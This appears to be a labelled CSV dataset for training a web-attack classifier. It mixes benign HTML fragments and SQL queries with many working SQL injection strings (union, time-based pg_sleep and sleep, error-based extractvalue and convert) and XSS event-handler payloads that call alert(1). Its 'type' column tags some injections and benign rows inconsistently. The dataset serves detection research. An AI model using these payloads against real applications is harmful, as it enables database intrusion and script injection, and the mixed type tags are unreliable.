Text,Label,type
"<li><cite id=""CITEREFDreyfus1992"" class=""citation book""><a href=""/wiki/Hubert_Dreyfus"" title=""Hubert Dreyfus"">Dreyfus, Hubert </a> (1992). <i>What Computers  </i>Still<i> Can't Do </i>. New York: MIT Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-262-54067-4"" title=""Special:BookSources/978-0-262-54067-4""><bdi>978-0-262-54067-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=What+Computers+Still+Can%27t+Do&amp;rft.place=New+York&amp;rft.pub=MIT+Press&amp;rft.date=1992&amp;rft.isbn=978-0-262-54067-4&amp;rft.aulast=Dreyfus&amp;rft.aufirst=Hubert&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"-2009%' union all select 1991,1991#",1,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT * FROM Customers  WHERE NOT Country = 'Germany'  AND NOT Country = 'USA';,0,xss
SELECT * FROM spend WHERE gas = 'weather'  AND  ( research = 'rising' OR mine = 'molecular' ) ,0,xss
29056,0,sql
"<li><a href=""/wiki/Information_theory"" title=""Information theory"">Information theory </a> </li>",0,xss
SELECT laid FROM anything,0,sql
"  SELECT asleep,hat FROM vast WHERE typical = 'his' UNION SELECT using, whenever FROM meal",0,sql
"1""  )   as saqy where 9704  =  9704   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,sql
anything' or 'x'  =  'x,1,xss
"1%"" union all select null,null--",1,sql
SELECT   LOCALTIMESTAMP (  ) ;,0,sql
SELECT thing ( s )  FROM exact LEFT JOIN,0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=South+China+Morning+Post&amp;rft.atitle=Will+your+job+still+exist+in+10+years+when+the+robots+arrive%3F&amp;rft.date=2017&amp;rft_id=http%3A%2F%2Fwww.scmp.com%2Ftech%2Finnovation%2Farticle%2F2098164%2Frobots-are-coming-here-are-some-jobs-wont-exist-10-years&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1""  )   where 1705  =  1705",1,sql
-2210' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'myvr' like 'myvr,1,xss
"<li><a href=""/wiki/Commonsense_reasoning"" title=""Commonsense reasoning"">Commonsense reasoning </a> </li>",0,xss
4270,0,sql
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",1,sql
"<param onmouseup=""alert(1)"">test</param>",2,xss
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat",1,xss
1%'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  '%'  =  ',1,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
SELECT pressure ( s FROM long RIGHT JOIN,0,sql
SELECT * FROM upper WHERE mainly BETWEEN 'these' AND 'clay',0,sql
"   SELECT COUNT ( stage ) , yourself FROM hardly BY fierce",0,sql
SELECT * FROM harder WHERE atom = 'voyage'  OR transportation = 'those',0,sql
4.47104E+15,0,xss
"1""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
1 or pg_sleep  (  __TIME__  )  --,1,sql
or 0  =  0 #,1,xss
85765253r,0,sql
dekeyser@creacionwebs.bn,0,sql
"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,sql
select   (  case when   (  6615  =  3564  )   then 1 else 6615*  (  select 6615 from master..sysdatabases  )   end  )  --,1,sql
"1%""  )   union all select null,null,null,null,null--",1,xss
SELECT TOP 50 PERCENT * FROM wagon,0,sql
SELECT * FROM flies ORDER BY voice DESC,0,xss
admin' or 1  =  1/*,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Rawlinson, Kevin (29 January 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.bbc.co.uk/news/31047780"">""Microsoft's Bill Gates insists AI is a threat"" </a>. <i>BBC News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20150129183607/http://www.bbc.co.uk/news/31047780"">Archived </a> from the original on 29 January 2015<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 January ",0,xss
"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",1,sql
"c/ antonio gonzalez suarez, 44, 11?c",0,xss
1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,sql
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,2,xss
<content id=x tabindex=1 onbeforeactivate=alert(1)></content>,2,xss
SELECT * FROM discover WHERE sun = 'carefully' LIMIT 3,0,sql
"          <dd><a href=""/en/master/"">master</a></dd>",0,xss
1 where 4003  =  4003 union all select null--,1,sql
SELECT dish ( s )  FROM bread UNION ALL,0,sql
ojinaga bascn,0,sql
	 </span>,0,xss
"  SELECT Orders.partyrID, Employees.your, Employees.roar FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.centralID ORDER BY Orders.deadID",0,xss
"<li><a href=""/wiki/Wilhelm_Wundt"" title=""Wilhelm Wundt"">Wilhelm Wundt </a> </li>",0,xss
SELECT AVG ( hospital ) FROM sometime SELECT SUM ( growth ) ,0,xss
calle gurugu 142 4?d,0,sql
"<table onmousedown=""alert(1)"">test</table>",2,xss
"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,sql
SELECT MIN ( recent )  AS bring FROM sense,0,sql
SELECT instrument FROM way UNION SELECT vast FROM sport ORDER BY rubber,0,sql
"1""  )   as dgzf where 4834  =  4834",1,sql
SELECT Count ( * )  AS rain,0,sql
SELECT lonely,0,xss
"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""bfko""  =  ""bfko",1,sql
SELECT * FROM property WHERE save = 'condition',0,sql
3549,0,xss
<tr id=x tabindex=1 onfocusin=alert(1)></tr>,2,xss
"1'  )   as fyuh where 7608  =  7608 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
	 </span> </li>,0,xss
46841,0,xss
SELECT * FROM bar,0,sql
<h1 onpointerup=alert(1)>XSS</h1>,2,xss
"<style>@keyframes slidein {}</style><abbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></abbr>",2,xss
"<bdi draggable=""true"" ondrag=""alert(1)"">test</bdi>",2,xss
<isindex id=x tabindex=1 onfocus=alert(1)></isindex>,2,xss
SELECT MIN ( thrown )  AS poor FROM evening,0,sql
1'  )   as zdhq where 5586  =  5586,1,sql
<svg><content onload=alert(1)></content>,2,xss
DELETE FROM headed,0,xss
balcom,0,sql
"  SELECT * FROM rich WHERE struggle NOT IN  ( 'grown', 'disappear', 'began' )  ",0,sql
SELECT strike,0,sql
368,0,xss
SELECT plan,0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",1,sql
1   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   7594  =  7594,1,sql
"<meter onbeforecut=""alert(1)"" contenteditable>test</meter>",2,xss
p0n64793a,0,sql
1'  )   where 5616  =  5616,1,sql
"avinguda castellot, 116,",0,sql
SELECT below ( s )  FROM dear UNION,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28341 )  ORDER BY meta_id ASC",0,sql
SELECT composed ( s )  FROM how FULL OUTER JOIN,0,sql
SELECT TOP 50 PERCENT * FROM unusual SELECT * FROM fourth FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gold,0,sql
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;22 </li>",0,xss
<svg><head onload=alert(1)></head>,2,xss
childree,0,sql
"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>",2,xss
SELECT * FROM  ( SELECT natural FROM run ) ,0,sql
eccles@aspirantes.gh,0,sql
"1""   )    )    as jmoy where 9676  =  9676 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"1   )    )     )   union all select null,null#",1,sql
"sol, 153",0,xss
select case when 5894  =  4052 then 1 else null end--,1,sql
45908,0,sql
"<keygen onbeforecopy=""alert(1)"" contenteditable>test</keygen>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><article ondrop=alert(1) contenteditable>drop here</article>",2,xss
SELECT * FROM yes WHERE certainly IN  ( SELECT heard FROM track ) ,0,sql
SELECT rabbit FROM plant UNION SELECT kids FROM stuck ORDER BY follow,0,sql
"1'   )    )    as uncy where 8009  =  8009 union all select null,null,null,null,null,null,null,null,null#",1,sql
<track id=x tabindex=1 onfocusin=alert(1)></track>,2,xss
"<cite class=""citation conference""><a href=""/wiki/Steve_Omohundro"" title=""Steve Omohundro"">Omohundro, Steve </a> (2008). <i>The Nature of Self-Improving Artificial Intelligence </i>. presented and distributed at the 2007 Singularity Summit, San Francisco, CA. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=conference&amp;rft.btitle=The+Nature+of+Self-Improving+Artificial+Intelligence&amp;rft.pub=presented+and+distributed+at+the+2007+Singularity+Summit%2C+San+Francisco%2C+CA.&amp;rft.date=2008&amp;rft.aulast=Omohundro&amp;rft.aufirst=Steve&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
inconse_cuente,0,sql
cassasola nochez,0,sql
-9564 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,sql
SELECT TOP 3 * FROM fall,0,xss
"<output onkeydown=""alert(1)"" contenteditable>test</output>",2,xss
"<style>:target {transform: rotate(180deg);}</style><command id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></command>",2,xss
<head id=x tabindex=1 onfocus=alert(1)></head>,2,xss
"   SELECT mental, against, pieFROM require WHERE trail  IS NOT NULL",0,sql
chlud_kumvongse@encuentrodominios.sd,0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT AVG ( model ) FROM stick,0,sql
SELECT * FROM atmosphere,0,sql
senen,0,sql
"-7941%'  )   union all select 6965,6965,6965,6965--",1,sql
enaltecedor,0,xss
SELECT TOP 50 PERCENT * FROM raise,0,xss
SELECT * FROM vertical WHERE ready = 'paid' FETCH FIRST 3 ROWS ONLY,0,sql
86274990n,0,xss
angullo acosta,0,xss
SELECT column_name ( s )  FROM table_name,0,xss
"marines, los",0,sql
1  )   where 2232  =  2232,1,sql
SELECT * FROM gate WHERE Price NOT BETWEEN 10 AND 20,0,sql
<cite id=x tabindex=1 onfocus=alert(1)></cite>,2,xss
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""%""  =  """,1,sql
 </p>,0,xss
"<script draggable=""true"" ondragend=""alert(1)"">test</script>",2,xss
SELECT COUNT ( fliesID ) FROM clock,0,sql
"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",2,xss
<header id=x tabindex=1 onactivate=alert(1)></header>,2,xss
"<li id=""cite_note-Feedforward_neural_networks-237""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Feedforward_neural_networks_237-0"">^ </a> </b> ",0,xss
"<ruby onkeyup=""alert(1)"" contenteditable>test</ruby>",2,xss
1.8461E+15,0,sql
1'  )   where 8167  =  8167,1,sql
"<li><a href=""/wiki/Cybernetics_in_the_Soviet_Union"" title=""Cybernetics in the Soviet Union"">Cybernetics in the Soviet Union </a> </li>",0,xss
17130,0,xss
bernad fermoselle,0,xss
<abbr onpointerup=alert(1)>XSS</abbr>,2,xss
1.93371E+15,0,sql
"-8203   )    )    as eqlf where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",1,sql
DELETE FROM thumb WHERE rise = 'review',0,sql
SELECT * FROM baby WHERE cast NOT LIKE 'twenty%',0,xss
SELECT * FROM charge WHERE vessels BETWEEN property09/01/1996hearing AND coffee15/31/1996year,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"-4707' union all select 4414,4414,4414,4414,4414,4414#",1,xss
SELECT * FROM bat  WHERE built = few,0,xss
select   (  case when   (  2717  =  2634  )   then 2717 else 2717*  (  select 2717 from mysql.db  )   end  )  #,1,xss
SELECT * FROM themselves 3 SELECT * FROM card,0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT * FROM traffic  WHERE deal NOT LIKE '[over]%',0,sql
"<s draggable=""true"" ondrag=""alert(1)"">test</s>",2,xss
<link onpointerdown=alert(1)>XSS</link>,2,xss
SELECT * FROM command WHERE carry = 'forward'  OR properly = 'outer',0,sql
induracin,0,sql
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1,sql
-9660   )    )    or 9762  =  9698,1,sql
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",1,sql
"<legend onbeforepaste=""alert(1)"" contenteditable>test</legend>",2,xss
"<div role=""search"">",0,xss
SELECT column_name FROM table1 RIGHT JOIN table2 ON table1.column_name  =  table2.column_name ;,0,sql
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationstart=""alert(1)""></footer>",2,xss
"INSERT INTO stranger ( outside, choice, too, sea, root, smile )  VALUES  ( 'likely', 'third'. deep', 'adult', 'straw', 'energy', 'dog' )  ",0,sql
"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ",1,sql
"1%""   )    )    and 8316  =  6410#",1,sql
9.0199E+15,0,sql
"<data draggable=""true"" ondragenter=""alert(1)"">test</data>",2,xss
20e28u6r,0,sql
SELECT shore FROM land UNION ALL SELECT president FROM feel ORDER BY race,0,sql
"<h3><span class=""mw-headline"" id=""Ethical_machines"">Ethical machines ",0,xss
culubret lluss,0,sql
1'+  (  select qtyi where 7147  =  7147,1,sql
end and    (    (   'eqoc' like 'eqoc,1,sql
"INSERT INTO fox ( helpful, being, like, harder, pound, contain )  VALUES  ( 'growth', 'attention'. should', 'clearly', 'instead', 'studied', 'ahead' )  ",0,sql
<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>,2,xss
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'dubu' like 'dubu",1,sql
"<input onbeforecopy=alert(1) value=""XSS"" autofocus>",2,xss
 </li>,0,xss
"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
cangrenarse,0,sql
SELECT AVG ( greatest ) FROM seen,0,sql
SELECT tone ( s )  FROM frog,0,sql
del cid labastie,0,xss
1'  )   and   (  1414  =  4775  )  *4775 and   (  'mlmw'  =  'mlmw,1,sql
"calle ter, 20,",0,xss
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",1,sql
"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",1,sql
"1%""   )    )     )   and 3116  =  9088#",1,sql
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'toft'  =  'toft",1,xss
SELECT * FROM negative WHERE poor = 'third' LIMIT 3,0,sql
SELECT TOP 3 * FROM ought WHERE attached = 'season',0,sql
1'  )   where 1212  =  1212,1,sql
<aside onpointerleave=alert(1)>XSS</aside>,2,xss
SELECT * FROM roll WHERE outline BETWEEN '1996-07-01' AND '1996-07-31',0,sql
select   (  case when   (  7822  =  4430  )   then 7822 else 1/  (  select 0  )   end  )  --,1,sql
SELECT * FROM price WHERE choice LIKE '%wrapped%',0,sql
"<aside onbeforepaste=""alert(1)"" contenteditable>test</aside>",2,xss
"<li><a href=""/wiki/Swarm_robotics"" title=""Swarm robotics"">Swarm </a> </li>",0,xss
standfor,0,sql
requisitorio,0,sql
29400,0,sql
1' and 2908  =  8067--,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Iphofen, Ron; Kritikos, Mihalis (3 January 2019). ""Regulating artificial intelligence and robotics: ethics by design in a digital society"". <i>Contemporary Social Science </i>: 1–15. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1080%2F21582041.2018.1563803"">10.1080/21582041.2018.1563803 </a>. <a href=""/wiki/International_Standard_Serial_Number"" title=""International Standard Serial Number"">ISSN </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/issn/2158-2041"">2158-2041 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Contemporary+Social+Science&amp;rft.atitle=Regulating+artificial+intelligence+and+robotics%3A+ethics+by+design+in+a+digital+society&amp;rft.pages=1-15&amp;rft.date=2019-01-03&amp;rft_id=info%3Adoi%2F10.1080%2F21582041.2018.1563803&amp;rft.issn=2158-2041&amp;rft.aulast=Iphofen&amp;rft.aufirst=Ron&amp;rft.au=Kritikos%2C+Mihalis&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT COUNT ( forceID ) FROM itself,0,sql
SELECT AVG ( public ) FROM to,0,sql
"  SELECT be AS up, solution AS [political]  FROM seed",0,xss
SELECT TOP 3 * FROM loud,0,xss
tarragona,0,xss
8349,0,sql
SELECT * FROM replace FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM policeman,0,sql
"1""   )    )    union all select null,null,null,null,null,null--",1,xss
SELECT * FROM difficult WHERE Price NOT BETWEEN 10 AND 20,0,sql
SELECT * FROM  ( SELECT bill FROM widely ) ,0,sql
SELECT * FROM except WHERE NOT has = 'somebody'  AND NOT perfect = 'foreign',0,sql
niel5,0,sql
beecher@mailboxrussia.gu,0,sql
rebolledo de la torre,0,xss
SELECT tales ( s )  FROM important,0,sql
"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",2,xss
1   )    )    as oqui where 3368  =  3368 order by 1--,1,sql
aventino,0,sql
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367657 ) ,0,xss
SELECT * FROM speed WHERE NOT wagon = 'throw'  AND NOT distance = 'depth',0,sql
"aldebaran 84,",0,sql
SELECT * FROM clothes WHERE NOT dear = 'deal'  AND NOT adventure = 'table',0,sql
confirmar,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/asyncio.html"">asyncio</a></li>",0,xss
"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",1,sql
"1%'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",1,sql
"1'+  (  select 'suzs' where 2905  =  2905 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",1,sql
SELECT AVG ( captured ) FROM pig,0,sql
bazet aguil,0,sql
SELECT COUNT ( completeID ) FROM ill,0,sql
"  SELECT laid,funny,once FROM lead LEFT JOIN Orders ON ready.pitchID =  tree.rise ORDER BY sure.came",0,xss
"1""  )   where 4588  =  4588",1,xss
"<plaintext onpaste=""alert(1)"" contenteditable>test</plaintext>",2,xss
"	 </span> <span class=""reference-text"">",0,xss
<sup onpointerdown=alert(1)>XSS</sup>,2,xss
SELECT known ( s )  FROM usually,0,xss
"<li class=""toclevel-2 tocsection-46""><a href=""#Advertising""><span class=""tocnumber"">7.11 ",0,xss
SELECT * FROM think WHERE consist = 'face',0,sql
"<dir onbeforecut=""alert(1)"" contenteditable>test</dir>",2,xss
